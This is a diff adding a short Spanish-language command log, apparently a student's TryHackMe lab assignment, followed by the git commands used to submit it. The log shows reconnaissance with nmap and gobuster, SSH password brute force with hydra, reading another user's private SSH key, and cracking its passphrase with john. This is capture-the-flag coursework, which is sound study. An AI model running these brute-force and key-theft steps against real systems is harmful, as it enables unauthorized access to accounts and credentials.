@@ -1,0 +1,28 @@
+# Conexión VPN y Reconocimiento
+sudo openvpn --config fabroo2005.ovpn
+nmap -sC -sV -oN nmap_inicial.txt 10.64.184.17
+gobuster dir -u http://10.64.184.17 -w /usr/share/wordlists/dirb/common.txt
+
+# Fuerza bruta y acceso inicial
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.64.184.17
+ssh jan@10.64.184.17
+
+# Extracción y crackeo de llave con Kali local
+cat /home/kay/.ssh/id_rsa
+nano id_rsa
+ssh2john id_rsa > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+# Escalada de privilegios
+chmod 600 id_rsa
+ssh -i id_rsa kay@10.64.184.17
+cat pass.bak
+
+# Comandos de Git usados
+git clone https://github.com/UCHSeguridad2026/TP_THM.git
+git checkout -b Funes-Fabricio
+git config user.name "Fabricio Funes"
+git config user.email "tu_correo_institucional@uch.edu.ar"
+git add .
+git commit -m "Entrega TP TryHackMe - Fabricio Funes"
+git push origin Funes-Fabricio
